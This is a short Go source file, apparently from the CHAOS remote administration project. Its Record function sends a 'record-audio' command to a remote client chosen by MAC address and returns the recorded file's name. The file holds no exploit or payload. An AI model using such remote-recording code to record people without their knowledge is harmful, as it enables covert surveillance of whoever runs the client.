package audio

import (
	"context"
	"fmt"

	"github.com/justadoll/CHAOS/services/client"
)

type AudioService struct {
	client.Service
}

func NewAudioService(clientService client.Service) Service {
	return &AudioService{clientService}
}

func (u AudioService) Record(ctx context.Context, address string, raw_seconds string) (fileName string, err error) {
	resp, err := u.SendCommand(ctx, client.SendCommandInput{
		MacAddress: address,
		Request:    fmt.Sprintf("record-audio %s", raw_seconds),
	})
	if err != nil {
		return "nil", err
	}
	fmt.Println("resp.Response", resp.Response) // filename
	return resp.Response, nil
}
